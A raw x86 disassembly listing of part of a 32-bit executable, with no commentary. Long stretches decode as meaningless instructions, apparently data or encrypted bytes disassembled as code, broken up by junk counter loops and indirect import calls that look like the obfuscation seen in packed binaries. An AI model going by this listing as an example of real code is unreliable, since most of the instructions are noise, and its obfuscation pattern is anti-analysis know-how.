  40e18b:	repz cmc 
  40e18d:	out    0xaf,al
  40e18f:	or     esi,DWORD PTR [ebx]
  40e191:	mov    ch,0x48
  40e193:	mov    al,0x8a
  40e195:	scas   al,BYTE PTR es:[edi]
  40e196:	repz inc edi
  40e198:	jbe    0x40e162
  40e19a:	fidivr DWORD PTR [ebx-0x7e66dba2]
  40e1a0:	loop   0x40e138
  40e1a2:	push   ss
  40e1a3:	pop    esi
  40e1a4:	fimul  WORD PTR [edx-0x8]
  40e1a7:	mov    dh,0xd2
  40e1a9:	sbb    al,0x88
  40e1ab:	or     eax,0x962aa565
  40e1b0:	hlt    
  40e1b1:	or     edi,edx
  40e1b3:	xchg   esi,eax
  40e1b4:	stos   BYTE PTR es:[edi],al
  40e1b5:	out    dx,al
  40e1b6:	mov    ecx,0xae880f7e
  40e1bb:	xchg   BYTE PTR [ebp+0x5ce28e5d],ah
  40e1c1:	add    ebp,eax
  40e1c3:	cdq    
  40e1c4:	mov    eax,ds:0xf8c8be3f
  40e1c9:	jmp    0x72da85cf
  40e1ce:	and    ah,BYTE PTR [edx-0x7b1908b0]
  40e1d4:	inc    eax
  40e1d5:	xchg   ebp,eax
  40e1d6:	int    0x65
  40e1d8:	mov    cl,0x98
  40e1da:	mov    DWORD PTR [esi-0x405bd86e],ecx
  40e1e0:	cwde   
  40e1e1:	jecxz  0x40e1b6
  40e1e3:	test   DWORD PTR [esi+edx*2-0x74b7696d],eax
  40e1ea:	idiv   DWORD PTR [esi]
  40e1ec:	mov    eax,ds:0x66724780
  40e1f1:	loopne 0x40e21d
  40e1f3:	call   0xcdcf:0xee6c5369
  40e1fa:	sti    
  40e1fb:	jne    0x40e189
  40e1fd:	sti    
  40e1fe:	sar    DWORD PTR [eax+0x6b],1
  40e201:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e202:	jmp    0x168e4dc7
  40e207:	sub    al,0x4a
  40e209:	mov    dh,0xfe
  40e20b:	xor    cl,ah
  40e20d:	push   ecx
  40e20e:	mov    ch,0xa5
  40e210:	aaa    
  40e211:	(bad)  
  40e212:	sbb    ebp,ecx
  40e214:	(bad)  
  40e215:	sbb    BYTE PTR [ebx+0x50142ee7],0x61
  40e21c:	stc    
  40e21d:	pop    ds
  40e21e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e21f:	sbb    al,0xe7
  40e221:	adc    BYTE PTR [esp+eiz*4+0x1c],dh
  40e225:	ret    
  40e226:	adc    eax,0xd7a1384b
  40e22b:	daa    
  40e22c:	mov    ds:0x29175eda,al
  40e231:	push   esp
  40e232:	sti    
  40e233:	mov    eax,DWORD PTR [ebp+0x650c7fa5]
  40e239:	repnz cwde 
  40e23b:	xor    BYTE PTR [edx+0x7],0xb9
  40e23f:	sbb    ah,BYTE PTR [eax+0x6b]
  40e242:	mov    ebx,0x2a2afdc4
  40e247:	mov    al,0x18
  40e249:	xchg   DWORD PTR [ecx+ebx*8],edi
  40e24c:	and    bh,BYTE PTR [edx+esi*1]
  40e24f:	clc    
  40e250:	cmp    BYTE PTR [ebp+0x66],bl
  40e253:	outs   dx,BYTE PTR ds:[esi]
  40e254:	xchg   BYTE PTR [edx],ch
  40e256:	not    BYTE PTR [esi+0x6e]
  40e259:	cmp    bh,BYTE PTR [edx+0x5e]
  40e25c:	cli    
  40e25d:	das    
  40e25e:	xor    ebx,DWORD PTR [edi]
  40e260:	or     DWORD PTR [ecx+0x1b],edx
  40e263:	sbb    eax,0x6db14816
  40e268:	cmp    ch,BYTE PTR [eax+0x2d99b630]
  40e26e:	and    BYTE PTR [edi],dh
  40e270:	jle    0x40e2bf
  40e272:	and    DWORD PTR [edx+0x6873178c],edi
  40e278:	fisttp WORD PTR [ecx-0x3ba72ff]
  40e27e:	and    DWORD PTR ds:0x42fcfd,0x0
  40e288:	mov    ecx,DWORD PTR ds:0x42fcfd
  40e28e:	inc    ecx
  40e28f:	mov    DWORD PTR ds:0x42fcfd,ecx
  40e295:	cmp    DWORD PTR ds:0x42fcfd,0x8
  40e29c:	jne    0x40e2b0
  40e2a2:	push   DWORD PTR [ebp-0x14]
  40e2a5:	push   0x5961
  40e2aa:	call   DWORD PTR ds:0x42e563
  40e2b0:	cmp    DWORD PTR ds:0x42fcfd,0x7
  40e2b7:	jne    0x40e2ca
  40e2bd:	mov    ecx,DWORD PTR ds:0x42fcfd
  40e2c3:	inc    ecx
  40e2c4:	mov    DWORD PTR ds:0x42fcfd,ecx
  40e2ca:	cmp    DWORD PTR ds:0x42fcfd,0x15
  40e2d1:	jb     0x40e288
  40e2d7:	and    DWORD PTR ds:0x42fd6e,0x0
  40e2e1:	jmp    0x40e2f3
  40e2e6:	mov    ecx,DWORD PTR ds:0x42fd6e
  40e2ec:	inc    ecx
  40e2ed:	mov    DWORD PTR ds:0x42fd6e,ecx
  40e2f3:	cmp    DWORD PTR ds:0x42fd6e,0x1b
  40e2fa:	jae    0x40e34c
  40e300:	cmp    DWORD PTR ds:0x42fd6e,0x9
  40e307:	jne    0x40e31b
  40e30d:	push   DWORD PTR [ebp-0x28]
  40e310:	push   0x42fd01
  40e315:	call   DWORD PTR ds:0x42e477
  40e31b:	cmp    DWORD PTR ds:0x42fd6e,0x8
  40e322:	jne    0x40e335
  40e328:	mov    ecx,DWORD PTR ds:0x42fd6e
  40e32e:	inc    ecx
  40e32f:	mov    DWORD PTR ds:0x42fd6e,ecx
  40e335:	jmp    0x40e2e6
  40e33a:	mov    ebx,DWORD PTR ds:0x42e794
  40e340:	mov    ecx,DWORD PTR ds:0x42e79c
  40e346:	sub    ebx,ecx
  40e348:	imul   ebx,DWORD PTR [ebx+ecx*1]
  40e34c:	mov    DWORD PTR [ebp-0x10],eax
  40e34f:	sub    ecx,ebx
  40e351:	mov    eax,DWORD PTR [ebp+0x8]
  40e354:	and    ebx,ecx
  40e356:	mov    ecx,DWORD PTR [ebp-0x10]
  40e359:	sbb    DWORD PTR ds:0x42fd72,ecx
  40e35f:	xor    eax,esi
  40e361:	add    eax,edi
  40e363:	mov    DWORD PTR [ecx],eax
  40e365:	jmp    0x40e4cf
  40e36a:	icebp  
  40e36b:	ja     0x40e334
  40e36d:	pop    ds
  40e36e:	inc    ecx
  40e36f:	scas   eax,DWORD PTR es:[edi]
  40e370:	icebp  
  40e371:	jno    0x40e314
  40e373:	push   edi
  40e374:	inc    eax
  40e375:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e376:	mov    edi,fs
  40e378:	or     dh,cl
  40e37a:	cmp    esp,DWORD PTR [eax+esi*2+0x707fc370]
  40e381:	jo     0x40e3fb
  40e383:	and    eax,0x94d02730
  40e388:	and    al,0x18
  40e38a:	lods   al,BYTE PTR ds:[esi]
  40e38b:	fistp  WORD PTR [ecx+0x62]
  40e38e:	xchg   DWORD PTR [edx-0x4c5fd91b],esi
  40e394:	dec    esi
  40e395:	mov    edi,0x1ee4cb4a
  40e39a:	(bad)  
  40e39b:	push   esp
  40e39c:	sbb    al,0x59
  40e39e:	mov    ebx,0x43316d57
  40e3a3:	idiv   BYTE PTR [ecx]
  40e3a5:	sub    dh,BYTE PTR [ecx]
  40e3a7:	mov    edx,0x28eeb610
  40e3ac:	push   0x43
  40e3ae:	(bad)  
  40e3af:	push   esp
  40e3b0:	push   ecx
  40e3b1:	aaa    
  40e3b2:	scas   eax,DWORD PTR es:[edi]
  40e3b3:	lods   eax,DWORD PTR ds:[esi]
  40e3b4:	mov    edi,0xb2315cda
  40e3b9:	loope  0x40e404
  40e3bb:	imul   eax,DWORD PTR [eax+0x45bce623],0xf1b48edd
  40e3c5:	and    bh,BYTE PTR [ebx]
  40e3c7:	loop   0x40e361
  40e3c9:	jl     0x40e3d8
  40e3cb:	sbb    eax,esi
  40e3cd:	sub    DWORD PTR [eax-0x69],eax
  40e3d0:	push   ds
  40e3d1:	push   edx
  40e3d2:	xor    BYTE PTR [ebp+0x65abaa43],0x64
  40e3d9:	add    eax,0x4c0c3229
  40e3de:	std    
  40e3df:	inc    esp
  40e3e0:	sbb    al,0xb
  40e3e2:	xchg   esi,eax
  40e3e3:	sbb    DWORD PTR [esi],eax
  40e3e5:	mov    cl,BYTE PTR [ecx+0x1b]
  40e3e8:	mov    esp,?
  40e3ea:	push   0x7b
  40e3ec:	stos   BYTE PTR es:[edi],al
  40e3ed:	pop    edi
  40e3ee:	sbb    BYTE PTR [eax],bl
  40e3f0:	jp     0x40e42b
  40e3f2:	leave  
  40e3f3:	div    DWORD PTR [ebp-0xa]
  40e3f6:	test   esp,ebx
  40e3f8:	push   0xffffffde
  40e3fa:	push   edi
  40e3fb:	mov    edx,0x5ed1e87d
  40e400:	push   edi
  40e401:	mov    WORD PTR [ebp-0x134681dc],ss
  40e407:	xchg   ebx,eax
  40e408:	push   edi
  40e409:	fnstcw WORD PTR [ebx+edx*2+0x1d42561]
  40e410:	jge    0x40e484
  40e412:	aas    
  40e413:	push   0xffffff84
  40e415:	push   ss
  40e416:	out    0xfd,eax
  40e418:	sti    
  40e419:	fsub   DWORD PTR [ecx+0x5d4a787c]
  40e41f:	(bad)  
  40e420:	pop    esp
  40e421:	je     0x40e411
  40e423:	cli    
  40e424:	repnz icebp 
  40e426:	js     0x40e3cb
  40e428:	jmp    0x839f:0xf6b2559
  40e42f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e430:	add    edi,DWORD PTR [edx+0x18b2b26b]
  40e436:	ss ins BYTE PTR es:[edi],dx
  40e438:	xchg   DWORD PTR [ecx+0x2b],edx
  40e43b:	lods   eax,DWORD PTR ds:[esi]
  40e43c:	xchg   esp,eax
  40e43d:	mov    ch,0x3a
  40e43f:	and    DWORD PTR [edi-0x23f76eaa],ebp
  40e445:	in     al,dx
  40e446:	jle    0x40e47e
  40e448:	xor    BYTE PTR [ebx-0x66],bl
  40e44b:	adc    al,0x89
  40e44d:	pusha  
  40e44e:	scas   al,BYTE PTR es:[edi]
  40e44f:	fidiv  WORD PTR [edi-0x6100f09]
  40e455:	inc    edi
  40e456:	stos   DWORD PTR es:[edi],eax
  40e457:	xchg   edx,eax
  40e458:	int3   
  40e459:	push   cs
  40e45a:	adc    DWORD PTR [edx-0x31bfa85c],ebp
  40e460:	pop    esi
  40e461:	xchg   edx,eax
  40e462:	das    
  40e463:	lock repz adc cl,BYTE PTR [ecx]
  40e467:	push   es
  40e468:	xor    al,0xc
  40e46a:	add    ah,BYTE PTR [edi+0x5279a6b8]
  40e470:	ret    0x712e
  40e473:	sbb    dl,BYTE PTR [ecx]
  40e475:	add    eax,0xa3a97df4
  40e47a:	pusha  
  40e47b:	jg     0x40e46a
  40e47d:	jmp    0xcf6247d9
  40e482:	and    bh,BYTE PTR [ebx-0x7a]
  40e485:	cmp    esp,ecx
  40e487:	lea    edx,[eax+ebp*1+0x25]
  40e48b:	arpl   WORD PTR [ecx+0x35],bp
  40e48e:	es ret 
  40e490:	mov    bh,0x0
  40e492:	test   DWORD PTR [ecx+0x70cba3a],ebx
  40e498:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e499:	cmc    
  40e49a:	cmp    eax,0x144bde70
  40e49f:	jne    0x40e430
  40e4a1:	and    BYTE PTR [edi],ch
  40e4a3:	xor    DWORD PTR [esp+edx*2],ecx
  40e4a6:	mov    ds:0xc25a273c,eax
  40e4ab:	jnp    0x40e517
  40e4ad:	add    al,0x22
  40e4af:	loope  0x40e516
  40e4b1:	mov    eax,ds:0x7fc59788
  40e4b6:	ss dec ecx
  40e4b8:	push   ebx
  40e4b9:	jle    0x40e4e0
  40e4bb:	gs push ecx
  40e4bd:	rcr    DWORD PTR [ebx],0x8a
  40e4c0:	and    ebp,ebp
  40e4c2:	pop    ebp
  40e4c3:	inc    esp
  40e4c4:	mov    cl,0xa8
  40e4c6:	mov    ?,ecx
  40e4c8:	(bad)  
  40e4c9:	call   0xc7c4:0xe02687e5
  40e4d0:	inc    ebp
  40e4d1:	call   0xf8dd6a07
  40e4d6:	and    ebx,0x399a
  40e4dc:	lea    eax,[ebp-0x18]
  40e4df:	mov    DWORD PTR [ebp-0x24],eax
  40e4e2:	jmp    0x40e64c
  40e4e7:	ror    DWORD PTR [eax+edi*4+0x61f15519],0x74
  40e4ef:	sbb    al,BYTE PTR ds:0x57ae740f
  40e4f5:	ret    0x8e6a
  40e4f8:	mov    ds:0x7fc37070,eax
  40e4fd:	jo     0x40e56f
  40e4ff:	sub    edx,DWORD PTR [edx-0x9344eab]
  40e505:	dec    edx
  40e506:	xchg   DWORD PTR [eax-0x61],ebp
  40e509:	inc    esi
  40e50a:	mov    bh,0x10
  40e50c:	dec    ebp
  40e50d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e50e:	push   ds
  40e50f:	and    al,0x3a
  40e511:	stos   BYTE PTR es:[edi],al
  40e512:	xchg   DWORD PTR [ebp-0x35],ebx
  40e515:	or     bl,BYTE PTR [eax]
  40e517:	inc    ecx
  40e518:	mov    al,ds:0x717cc35d
  40e51d:	scas   eax,DWORD PTR es:[edi]
  40e51e:	int3   
  40e51f:	leave  
  40e520:	pop    ebp
  40e521:	xchg   ebp,eax
  40e522:	jg     0x40e537
  40e524:	jp     0x40e539
  40e526:	sub    esp,ecx
  40e528:	xor    BYTE PTR [ecx],al
  40e52a:	inc    ebx
  40e52b:	repnz enter 0x13cf,0x66
  40e530:	inc    eax
  40e531:	jb     0x40e573
  40e533:	out    0x46,eax
  40e535:	jge    0x40e4c7
  40e537:	cmp    BYTE PTR [ecx+0x4d50d4fc],bl
  40e53d:	into   
  40e53e:	ss (bad) 
  40e540:	mov    dh,0x94
  40e542:	sub    eax,DWORD PTR [edi]
  40e544:	pop    es
  40e545:	pop    eax
  40e546:	inc    esp
  40e547:	mov    es,WORD PTR [ecx+0x3d]
  40e54a:	mov    fs,WORD PTR [edi+0x3627b659]
  40e550:	jnp    0x40e54a
  40e552:	mov    al,0x84
  40e554:	adc    bh,al
  40e556:	fdiv   DWORD PTR [ebx+0x30ef857c]
  40e55c:	mov    esp,edi
  40e55e:	mov    ebp,0xafa4c50c
  40e563:	and    DWORD PTR fs:[eax],0x5d
  40e567:	std    
  40e568:	inc    eax
  40e569:	pop    DWORD PTR [ecx+0x25]
  40e56c:	push   esp
  40e56d:	into   
  40e56e:	stos   DWORD PTR es:[edi],eax
  40e56f:	call   0x3b3ee805
  40e574:	std    
  40e575:	sub    al,ch
  40e577:	pop    ebx
  40e578:	popa   
  40e579:	push   ds
  40e57a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e57b:	adc    BYTE PTR [eax+0x54],0xc0
  40e57f:	jb     0x40e58f
  40e581:	adc    dl,BYTE PTR [ebx]
  40e583:	and    eax,0x8e2f487d
  40e588:	push   eax
  40e589:	sub    al,0xe2
  40e58b:	cmc    
  40e58c:	arpl   WORD PTR [edx+eax*1+0x6efe6803],cx
  40e593:	rcl    esi,0x99
  40e596:	mov    ch,0x2
  40e598:	sbb    DWORD PTR [edx-0x70],esi
  40e59b:	ss fwait
  40e59d:	mov    edx,0x12990c65
  40e5a2:	adc    ch,BYTE PTR [esi+0x5b]
  40e5a5:	stc    
  40e5a6:	call   0xe2a7:0xc0a89a2d
  40e5ad:	mov    ch,0xe7
  40e5af:	icebp  
  40e5b0:	ins    BYTE PTR es:[edi],dx
  40e5b1:	pusha  
  40e5b2:	pop    eax
  40e5b3:	ss cwde 
  40e5b5:	pop    ebx
  40e5b6:	cdq    
  40e5b7:	repnz cld 
  40e5b9:	or     ebp,ebx
  40e5bb:	aaa    
  40e5bc:	fist   DWORD PTR [ecx]
  40e5be:	adc    DWORD PTR [edi+0x2a41e7ef],edx
  40e5c4:	hlt    
  40e5c5:	loop   0x40e60a
  40e5c7:	stos   DWORD PTR es:[edi],eax
  40e5c8:	iret   
  40e5c9:	cs mov ch,0x17
  40e5cc:	sub    edx,esi
  40e5ce:	and    al,0xd0
  40e5d0:	rol    BYTE PTR [ecx+ebp*2+0x52],0xc7
  40e5d5:	ja     0x40e5cf
  40e5d7:	xor    DWORD PTR [eax-0x33423737],0x1d
  40e5de:	ins    BYTE PTR es:[edi],dx
  40e5df:	cs in  eax,0x10
  40e5e2:	pusha  
  40e5e3:	stc    
  40e5e4:	icebp  
  40e5e5:	inc    edi
  40e5e6:	xchg   esi,eax
  40e5e7:	push   eax
  40e5e8:	mov    eax,DWORD PTR [eax+0x75d9df6d]
  40e5ee:	or     eax,0x3bf8d581
  40e5f3:	(bad)  
  40e5f4:	jnp    0x40e5ad
  40e5f6:	shr    bl,1
  40e5f8:	(bad)  
  40e5f9:	cdq    
  40e5fa:	fld    TBYTE PTR [esi-0x227969d5]
  40e600:	mov    gs,ecx
  40e602:	fwait
  40e603:	push   0xcbed9c67
  40e608:	add    eax,0x46058438
  40e60d:	cmp    ch,dl
  40e60f:	icebp  
  40e610:	fnstsw WORD PTR [edx+0x2e]
  40e613:	adc    al,0xd3
  40e615:	mov    eax,ds:0xedf5d031
  40e61a:	lods   al,BYTE PTR ds:[esi]
  40e61b:	jbe    0x40e5a6
  40e61d:	call   0xcef6:0xde86e8d5
  40e624:	popf   
  40e625:	(bad)  
  40e626:	push   ecx
  40e627:	cld    
  40e628:	jmp    0x404a:0xa96c9ff0
  40e62f:	and    ebx,DWORD PTR [edi*8-0x4448c92b]
  40e636:	cmp    al,0x22
  40e638:	mov    edx,0x1196efda
  40e63d:	xchg   ecx,eax
  40e63e:	lahf   
  40e63f:	mov    esp,0xce09ef62
  40e644:	enter  0xc14d,0x6f
  40e648:	inc    esi
  40e649:	fs xor ecx,ebp
  40e64c:	mov    eax,DWORD PTR [ebp-0x18]
  40e64f:	and    DWORD PTR ds:0x42fd7a,0x0
  40e659:	jmp    0x40e66b
  40e65e:	mov    ebx,DWORD PTR ds:0x42fd7a
  40e664:	inc    ebx
  40e665:	mov    DWORD PTR ds:0x42fd7a,ebx
  40e66b:	cmp    DWORD PTR ds:0x42fd7a,0x1e
  40e672:	jae    0x40e697
  40e678:	cmp    DWORD PTR ds:0x42fd7a,0x24
  40e67f:	jne    0x40e690
  40e685:	push   0x1cae
  40e68a:	call   DWORD PTR ds:0x42e47b
  40e690:	jmp    0x40e65e
  40e695:	neg    ebx
  40e697:	mov    ecx,DWORD PTR [ebp-0x24]
  40e69a:	add    ebx,0x74bf
  40e6a0:	xor    eax,esi
  40e6a2:	add    eax,edi
  40e6a4:	sub    DWORD PTR ds:0x42e11c,edx
  40e6aa:	mov    DWORD PTR [ecx],eax
  40e6ac:	mov    eax,ds:0x41b27c
  40e6b1:	adc    DWORD PTR ds:0x42fd01,ebx
  40e6b7:	mov    ebx,0x8e12febe
  40e6bc:	mov    DWORD PTR [ebp-0xc],ebx
  40e6bf:	adc    DWORD PTR ds:0x42fcd9,0x7944
  40e6c9:	jmp    0x40e833
  40e6ce:	cmp    dl,bl
  40e6d0:	in     al,dx
  40e6d1:	fcomi  st,st(1)
  40e6d3:	jecxz  0x40e69e
  40e6d5:	icebp  
  40e6d6:	xor    al,0x3a
  40e6d8:	iret   
  40e6d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6da:	rol    esi,cl
  40e6dc:	imul   ecx,DWORD PTR [edi],0x51
  40e6df:	mov    ds:0x7fc37070,al
  40e6e4:	jo     0x40e756
  40e6e6:	push   esi
  40e6e7:	pop    edx
  40e6e8:	test   esi,esi
  40e6ea:	mov    al,0x1f
  40e6ec:	out    0x8f,al
  40e6ee:	ror    DWORD PTR [esp+edx*4-0x19e4c69a],1
  40e6f5:	lods   al,BYTE PTR ds:[esi]
  40e6f6:	inc    ecx
  40e6f7:	scas   eax,DWORD PTR es:[edi]
  40e6f8:	addr16 cdq 
  40e6fa:	out    dx,eax
  40e6fb:	and    esi,DWORD PTR [esi]
  40e6fd:	add    DWORD PTR [ecx+edi*4],ecx
  40e700:	je     0x40e741
  40e702:	mov    ecx,0xc218dc5e
  40e707:	pop    ss
  40e708:	mov    esp,0x327977b2
  40e70d:	iret   
  40e70e:	jae    0x40e76c
  40e710:	daa    
  40e711:	mov    ds:0x5e702c3c,eax
  40e716:	push   ss
  40e717:	mov    ch,0xc3
  40e719:	rol    BYTE PTR [ebx-0x77b7e7eb],cl
  40e71f:	bound  eax,QWORD PTR [edi]
  40e721:	or     al,0xbb
  40e723:	jne    0x40e78d
  40e725:	mov    WORD PTR [ecx+0x707e18c3],cs
  40e72b:	mov    bl,0x21
  40e72d:	mov    dl,0xbd
  40e72f:	push   DWORD PTR [ecx]
  40e731:	and    DWORD PTR [esi+ebp*2],ebx
  40e734:	and    ebp,DWORD PTR [ecx+0x25c7b13d]
  40e73a:	jmp    0x75949f6c
  40e73f:	(bad)  
  40e740:	into   
  40e741:	or     al,0x86
  40e743:	xchg   DWORD PTR [esi+eiz*4],edi
  40e746:	das    
  40e747:	and    dl,BYTE PTR [esi+0x72b8bdd0]
  40e74d:	inc    ecx
  40e74e:	sub    ecx,DWORD PTR [edx-0x7f9d51d9]
  40e754:	mov    bl,0x47
  40e756:	mov    ah,0x9b
  40e758:	mulps  xmm3,XMMWORD PTR [esi+0x39]
  40e75c:	retf   0xf4dd
  40e75f:	xchg   DWORD PTR [esi-0x5a3bf9c7],edi
  40e765:	xchg   esi,eax
  40e766:	or     al,0xd8
  40e768:	popf   
  40e769:	mov    ecx,DWORD PTR [edi]
  40e76b:	call   0x65f3:0x7f3437f6
  40e772:	jmp    0x629e3340
  40e777:	mov    ch,0x36
  40e779:	inc    ebx
  40e77a:	mov    BYTE PTR [eax+eax*2-0x59],0xa3
  40e77f:	and    esp,edi
  40e781:	dec    edi
  40e782:	into   
  40e783:	int3   
  40e784:	in     al,dx
  40e785:	cld    
  40e786:	add    eax,DWORD PTR [esi+0x1dda6050]
  40e78c:	ss inc eax
  40e78e:	and    ch,BYTE PTR [ecx]
  40e790:	mov    ah,0x5c
  40e792:	std    
  40e793:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e794:	pop    esi
  40e795:	ins    BYTE PTR es:[edi],dx
  40e796:	or     BYTE PTR [edi-0x7a],cl
  40e799:	das    
  40e79a:	bound  edi,QWORD PTR [eax]
  40e79c:	sbb    dl,BYTE PTR [eax]
  40e79e:	pop    esi
  40e79f:	mov    ch,0xc7
  40e7a1:	adc    BYTE PTR [esi],ch
  40e7a3:	out    dx,eax
  40e7a4:	cmp    BYTE PTR [edi],0x2f
  40e7a7:	mov    ecx,0x7b2f5203
  40e7ac:	or     BYTE PTR [ebp-0x76],dl
  40e7af:	and    al,0x4f
  40e7b1:	int3   
  40e7b2:	inc    eax
  40e7b3:	gs or  eax,0x96e9e983
  40e7b9:	scas   eax,DWORD PTR es:[edi]
  40e7ba:	jae    0x40e831
  40e7bc:	test   BYTE PTR fs:[esi+0x3c],dh
  40e7c0:	rcr    DWORD PTR [edi+0x70],cl
  40e7c3:	cmp    esp,DWORD PTR [edx+0x86dce43]
  40e7c9:	scas   al,BYTE PTR es:[edi]
  40e7ca:	lods   al,BYTE PTR ds:[esi]
  40e7cb:	fsubr  DWORD PTR [ebx-0x12]
  40e7ce:	xchg   ebp,eax
  40e7cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7d0:	mov    bh,0xc4
  40e7d2:	mov    ebx,0xee557f48
  40e7d7:	xor    al,0x1a
  40e7d9:	jae    0x40e820
  40e7db:	fs iret 
  40e7dd:	mov    DWORD PTR [edi+0x11],edx
  40e7e0:	jmp    0xcd8e:0x655397a9
  40e7e7:	jbe    0x40e853
  40e7e9:	adc    al,0x3a
  40e7eb:	dec    edi
  40e7ec:	add    al,0x84
  40e7ee:	in     al,dx
  40e7ef:	pop    edi
  40e7f0:	sar    DWORD PTR [ebx-0x3993e070],cl
  40e7f6:	enter  0x95a6,0x9
  40e7fa:	xor    eax,0x3517834
  40e7ff:	pop    esp
  40e800:	es mov cl,0x61
  40e803:	inc    esi
  40e804:	mov    dl,0x1a
  40e806:	dec    eax
  40e807:	pop    ebp
  40e808:	or     ecx,DWORD PTR [ebx]
  40e80a:	fxch   st(0)
  40e80c:	push   esi
  40e80d:	jge    0x40e7ec
  40e80f:	aaa    
  40e810:	cdq    
  40e811:	mov    dh,ah
  40e813:	addr16 inc ecx
  40e815:	inc    ebp
  40e816:	dec    eax
  40e817:	mov    edx,0xfb36f15e
  40e81c:	icebp  
  40e81d:	inc    ebx
  40e81e:	les    edx,FWORD PTR [eax-0x4f47d2cb]
  40e824:	call   0xa346:0xbe04d48f
  40e82b:	sar    dh,0xa9
  40e82e:	jmp    0x21bc4b4d
  40e833:	mov    eax,DWORD PTR [eax]
  40e835:	adc    DWORD PTR ds:0x42fce9,0x5067
  40e83f:	mov    cx,WORD PTR [ebp-0x4]
  40e843:	xor    DWORD PTR ds:0x42fd0d,0x42fd7e
  40e84d:	movzx  ecx,cx
  40e850:	add    ecx,DWORD PTR [eax]
  40e852:	neg    eax
  40e854:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40e85b:	sbb    eax,0x5a1e
  40e860:	mov    DWORD PTR [ebp-0x1c],ecx
  40e863:	mov    eax,DWORD PTR [ebp+0x8]
  40e866:	sbb    ecx,DWORD PTR ds:0x42fce1
  40e86c:	mov    ecx,DWORD PTR [ebp-0x8]
  40e86f:	xor    DWORD PTR ds:0x42e11c,0x42e6ef
  40e879:	xor    eax,esi
  40e87b:	and    DWORD PTR ds:0x42e70b,0x57ad
  40e885:	add    eax,edi
  40e887:	cmp    DWORD PTR [ecx],eax
  40e889:	jne    0x40efe4
  40e88f:	and    DWORD PTR ds:0x42fcd1,0x0
  40e899:	jmp    0x40e8ab
  40e89e:	mov    ecx,DWORD PTR ds:0x42fcd1
  40e8a4:	inc    ecx
  40e8a5:	mov    DWORD PTR ds:0x42fcd1,ecx
  40e8ab:	cmp    DWORD PTR ds:0x42fcd1,0x11
  40e8b2:	jae    0x40e8fe
  40e8b8:	cmp    DWORD PTR ds:0x42fcd1,0x8
  40e8bf:	jne    0x40e8d0
  40e8c5:	push   0x42e1e7
  40e8ca:	call   DWORD PTR ds:0x42e47f
  40e8d0:	cmp    DWORD PTR ds:0x42fcd1,0x7
  40e8d7:	jne    0x40e8ec
  40e8dd:	xor    ecx,ecx
  40e8df:	add    ecx,DWORD PTR ds:0x42fcd1
  40e8e5:	inc    ecx
  40e8e6:	mov    DWORD PTR ds:0x42fcd1,ecx
  40e8ec:	jmp    0x40e89e
  40e8f1:	movzx  ecx,BYTE PTR ds:0x42fd8a
  40e8f8:	adc    DWORD PTR ds:0x42e6ff,ecx
  40e8fe:	mov    eax,DWORD PTR [ebp+0x8]
  40e901:	xor    DWORD PTR ds:0x42e6f7,0x70e3
  40e90b:	mov    ecx,DWORD PTR [ebp-0x1c]
  40e90e:	and    DWORD PTR ds:0x42e6fb,0x42e6ef
  40e918:	xor    eax,esi
  40e91a:	not    DWORD PTR ds:0x42fd01
  40e920:	add    eax,edi
  40e922:	mov    DWORD PTR ds:0x42fd0d,0x37d2
  40e92c:	cmp    DWORD PTR [ecx],eax
  40e92e:	mov    DWORD PTR ds:0x42e70b,0x263d
  40e938:	jmp    0x40eaa2
  40e93d:	(bad)  
  40e93e:	(bad)  
  40e93f:	fistp  DWORD PTR [ebx+0x65445961]
  40e945:	shl    BYTE PTR [edi-0x39],0x63
  40e949:	addr16 push cs
  40e94b:	mov    ch,0x86
  40e94d:	and    al,0xa0
  40e94f:	jo     0x40e9c1
  40e951:	ret    
  40e952:	jg     0x40e9c4
  40e954:	jo     0x40e8dd
  40e956:	fsubr  DWORD PTR [edi-0x268c68e]
  40e95c:	sbb    edx,eax
  40e95e:	addr16 or dh,ah
  40e961:	rcl    ecx,0x8e
  40e964:	jo     0x40e976
  40e966:	out    0x3d,eax
  40e968:	pop    DWORD PTR [esi]
  40e96a:	adc    BYTE PTR [ebp+0xcce8321],cl
  40e970:	add    ebp,DWORD PTR [ebx+eax*4]
  40e973:	repz pop eax
  40e975:	sub    edi,DWORD PTR [ebx+0xa]
  40e978:	ret    0xcb6f
  40e97b:	jp     0x40e9d2
  40e97d:	pop    esi
  40e97e:	fisttp QWORD PTR [edx+eiz*1-0x41cc46bd]
  40e985:	pushf  
  40e986:	sbb    esi,0x40
  40e989:	ret    0xe850
  40e98c:	mov    ds:0xe597cc90,al
  40e991:	cs (bad) 
  40e994:	rol    DWORD PTR [edi+0x56],0x50
  40e998:	inc    esp
  40e999:	rcr    BYTE PTR [eax-0x42],0x46
  40e99d:	call   0x6830505a
  40e9a2:	adc    esi,DWORD PTR [esi+0x203c28fb]
  40e9a8:	push   eax
  40e9a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9aa:	lahf   
  40e9ab:	xchg   esi,eax
  40e9ac:	lahf   
  40e9ad:	adc    bh,BYTE PTR [ebp-0x565b49ec]
  40e9b3:	clc    
  40e9b4:	pushf  
  40e9b5:	div    BYTE PTR [ecx+0x1c]
  40e9b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9b9:	(bad)  
  40e9ba:	sub    eax,esi
  40e9bc:	ja     0x40e9af
  40e9be:	aam    0x31
  40e9c0:	jp     0x40e9dc
  40e9c2:	popa   
  40e9c3:	(bad)  
  40e9c4:	adc    eax,0xac7ca84c
  40e9c9:	pop    ss
  40e9ca:	ficomp DWORD PTR ds:0xd489a84e
  40e9d0:	push   ebx
  40e9d1:	cmp    eax,0x3ce201ea
  40e9d6:	push   ecx
  40e9d7:	sahf   
  40e9d8:	push   edx
  40e9d9:	cmp    DWORD PTR [edi],esp
  40e9db:	rol    DWORD PTR [esi-0x1655bcd7],cl
  40e9e1:	inc    ebx
  40e9e2:	int3   
